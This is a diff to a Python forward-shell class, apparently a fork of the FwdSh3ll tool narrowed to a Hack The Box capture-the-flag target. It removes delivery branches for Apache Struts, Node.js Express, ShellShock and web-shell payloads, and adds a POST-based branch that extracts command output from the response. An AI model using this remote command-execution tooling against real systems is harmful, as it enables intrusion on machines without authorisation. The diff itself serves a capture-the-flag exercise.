@@ -119,30 +119,20 @@ class ForwardShell:
 
 	@staticmethod
 	def run_raw_cmd(cmd, url, proxy, payload_name, gen_payload, timeout=50, first_connect=False):
-		if payload_name == 'ApacheStruts':
-			payload = gen_payload(cmd)
-			headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
-			cookies = {}
-		elif payload_name == 'NodejsExpress':
-			payload = gen_payload(cmd)
+		if payload_name == 'HTBCTF':
+			cookies, data = gen_payload(cmd)
 			headers = {'User-Agent': 'Mozilla/5.0'}
-			cookies = {'profile': payload}
-		elif payload_name == 'ShellShock':
-			payload = gen_payload(cmd)
-			headers = {'User-Agent': payload}
-			cookies = {}
-		elif payload_name == 'WebShell':
-			url += cmd
-			headers = {'User-Agent': 'Mozilla/5.0'}
-			cookies = {}
+		else:
+			raise Exception('This fork of FwdSh3ll was made for demonstration purposes and works only with the "HTBCTF.py" payload')
 
 		while True:
 			page = b''
 			try:
-				with requests.get(
+				with requests.post(
 					url,
 					headers=headers,
 					cookies=cookies,
+					data=data,
 					proxies=proxy,
 					timeout=timeout,
 					verify=False,
@@ -171,7 +161,7 @@ class ForwardShell:
 				cprint(f'[SHELL] Exception caught: {str(e)}', 'yellow')
 				return None
 
-		return page.decode('utf-8')
+		return re.search(r'<pre>(.*?)</pre>', page.decode('utf-8'), re.DOTALL).group(1)
 
 	def write_cmd(self, cmd, named_pipes=True):
 		if named_pipes:
